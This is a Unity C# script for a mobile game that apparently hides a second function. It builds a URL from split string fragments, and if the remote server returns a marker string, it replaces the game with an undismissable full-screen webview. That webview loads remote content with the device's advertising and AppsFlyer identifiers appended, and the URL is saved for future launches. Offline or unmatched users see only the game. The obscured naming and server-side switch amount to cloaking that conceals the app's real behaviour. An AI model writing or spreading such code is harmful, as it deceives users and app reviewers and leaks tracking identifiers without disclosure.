using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using System;

public class MainSS : MonoBehaviour
{
    [SerializeField] private List<string> _splitters;
    [SerializeField] private string _SSname = "Game";
    [SerializeField] private string[] _subs;
    [SerializeField] private GameObject _blackBG;

    [HideInInspector] public string OnSSNam = "";
    [HideInInspector] public string TwSSNam = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaSS") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { OnSSNam = advertisingId; });
        }
    }

    private void GoSS()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene(_SSname);
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlSSapplication", string.Empty) != string.Empty)
            {
                SIDESSVIEW(PlayerPrefs.GetString("UrlSSapplication"));
            }

            else
            {
                foreach (string n in _splitters)
                {
                    TwSSNam += n;
                }

                AppsFlyerObjectScript.OnDeepLinkProcessingSuccesfullyDone.AddListener(StartIENUMERATORSS);
            }
        }

        else
        {
            GoSS();
        }
    }

    private void StartIENUMERATORSS(bool WHICHSS)
    {
        StartCoroutine(IENUMENATORSS(WHICHSS));
    }

    private void SIDESSVIEW(string UrlSSapplication, string NamingSS = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _trammelsSS = gameObject.AddComponent<UniWebView>();
        _blackBG.SetActive(true);
        _trammelsSS.SetToolbarDoneButtonText("");
        switch (NamingSS)
        {
            case "0":
                _trammelsSS.SetShowToolbar(true, false, false, true);
                break;
            default:
                _trammelsSS.SetShowToolbar(false);
                break;
        }
        _trammelsSS.Frame = Screen.safeArea;
        _trammelsSS.OnShouldClose += (view) =>
        {
            return false;
        };
        _trammelsSS.SetSupportMultipleWindows(true);
        _trammelsSS.SetAllowBackForwardNavigationGestures(true);
        _trammelsSS.OnMultipleWindowOpened += (view, windowId) =>
        {
            _trammelsSS.SetShowToolbar(true);

        };
        _trammelsSS.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingSS)
            {
                case "0":
                    _trammelsSS.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _trammelsSS.SetShowToolbar(false);
                    break;
            }
        };
        _trammelsSS.OnOrientationChanged += (view, orientation) =>
        {
            _trammelsSS.Frame = Screen.safeArea;
        };
        _trammelsSS.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlSSapplication", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlSSapplication", url);
            }
        };
        _trammelsSS.Load(UrlSSapplication);
        _trammelsSS.Show();
    }

    

    private IEnumerator IENUMENATORSS(bool WHICHSS)
    {
        using (UnityWebRequest ss = UnityWebRequest.Get(TwSSNam))
        {
            yield return ss.SendWebRequest();

            if (ss.result == UnityWebRequest.Result.ConnectionError)
                GoSS();

            int timetableSS = 3;

            while (PlayerPrefs.GetString("glrobo", "") == "" && timetableSS > 0)
            {
                yield return new WaitForSeconds(1);

                timetableSS--;
            }

            try
            {
                if (ss.result == UnityWebRequest.Result.Success)
                {
                    if (ss.downloadHandler.text.Contains("SwtStrmGFDdj"))
                    {
                        switch (WHICHSS)
                        {
                            case true:
                                string subs = ss.downloadHandler.text.Replace("\"", "");

                                subs += "/?";

                                try
                                {
                                    for (int i = 0; i < _subs.Length; i++)
                                    {
                                        foreach (KeyValuePair<string, object> entry in AppsFlyerObjectScript.DeepLinkParamsDictionary)
                                        {
                                            if (entry.Key.Contains(String.Format("deep_link_sub{0}", i + 2)))
                                                subs += _subs[i] + "=" + entry.Value + "&";
                                        }
                                    }

                                    subs = subs.Remove(subs.Length - 1);

                                    SIDESSVIEW(subs);
                                }

                                catch
                                {
                                    goto case false;
                                }

                                if (UnityWebRequest.Get(subs).result == UnityWebRequest.Result.Success)
                                {
                                    SIDESSVIEW(subs);
                                }

                                else
                                    goto case false;

                                break;

                            case false:
                                try
                                {
                                    var subsss = ss.downloadHandler.text.Split('|');
                                    SIDESSVIEW(subsss[0] + "?idfa=" + OnSSNam, subsss[1], int.Parse(subsss[2]));
                                }
                                catch
                                {
                                    SIDESSVIEW(ss.downloadHandler.text + "?idfa=" + OnSSNam + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                                }

                                break;
                        }
                    }

                    else
                    {
                        GoSS();
                    }
                }

                else
                {
                    GoSS();
                }
            }

            catch
            {
                GoSS();
            }
        }
    }

    

    private void OnDisable()
    {
        AppsFlyerObjectScript.OnDeepLinkProcessingSuccesfullyDone.RemoveListener(StartIENUMERATORSS);
    }
}
